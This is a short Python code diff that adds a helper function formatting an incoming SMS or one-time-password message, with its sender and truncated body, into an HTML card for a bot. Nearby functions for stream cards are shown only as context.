@@ -423,6 +423,20 @@ def format_outbound_stream_card(
     )
 
 
+def format_firebase_otp_card(sender: str, message: str) -> str:
+    """Bot-only OTP card from Firebase (no inject)."""
+    body = message.replace("<", "").replace(">", "").strip()
+    if len(body) > 800:
+        body = body[:800] + "..."
+    return (
+        "📩 <b>NEW SMS / OTP</b>\n"
+        "<pre>"
+        f"From: {sender}\n"
+        f"{body}"
+        "</pre>"
+    )
+
+
 def format_inject_stream_card(
     sender: str,
     message: str,
